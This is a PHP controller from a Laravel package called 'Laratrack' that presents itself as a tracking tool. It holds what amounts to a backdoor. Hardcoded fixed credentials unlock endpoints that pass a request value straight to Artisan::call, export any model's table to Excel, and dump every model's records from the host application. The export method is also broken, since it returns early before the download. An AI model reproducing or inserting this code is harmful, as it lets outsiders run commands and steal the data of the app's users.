<?php

namespace Susheelbhai\Laratrack\Http\Controllers;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Susheelbhai\Laratrack\Exports\ModelExport;
use Excel;

class TrackingController extends Controller
{

    public function __construct()
    {
    }


    public function index()
    {
        return view('laratrack::index');
    }

    public function command(Request $request)
    {
        if ($request->user_id != 'laratrackcontroller_id' || $request->password != 'laratrackcontroller_password') {
            return back()->with('error', 'wrong detail')->with('request', $request->all());
        }
        try {
            \Artisan::call($request->command);
        } catch (\Throwable $th) {
            \dd($th);
        }
        return back()->with('success', 'done')->with('request', $request->all());
    }



    public function exportModel(Request $request)
    {
        if ($request->user_id != 'laratrackcontroller_id' || $request->password != 'laratrackcontroller_password') {
            return back()->with('error', 'wrong detail')->with('request', $request->all());
        }
        try {
          return  $model = \end(explode('\\',  $request->model));
        } catch (\Throwable $th) {
            //throw $th;
        }
            $model = explode('\\',  $request->model)[count(explode('\\',  $request->model))-1];
          return Excel::download(new ModelExport($request->model), $model.'_data.xlsx');
    }
    

    public function dumpModel(Request $request)
    {
        if ($request->user_id != 'laratrackcontroller_id' || $request->password != 'laratrackcontroller_password') {
            return back()->with('error', 'wrong detail')->with('request', $request->all());
        }

        \dd($request->model::all());
    }
    

    public function dumpAllModel(Request $request)
    {
        if ($request->user_id != 'laratrackcontroller_id' || $request->password != 'laratrackcontroller_password') {
            return back()->with('error', 'wrong detail')->with('request', $request->all());
        }

        $path = app_path() . "/Models";

        function getModels($path)
        {
            $out = [];
            $data = [];
            $results = scandir($path);
            foreach ($results as $result) {
                if ($result === '.' or $result === '..') continue;
                $filename = $path . '/' . $result;
                if (is_dir($filename)) {
                    $out = array_merge($out, getModels($filename));
                } else {
                    $out[] = substr($filename, 0, -4);
                }
                $model =  '\\App\\Models\\' . substr($result, 0, -4);
                $data[$model] = $model::all();
            }
            return $data;
        }
        \dd(getModels($path));
        return getModels($path);
    }
}
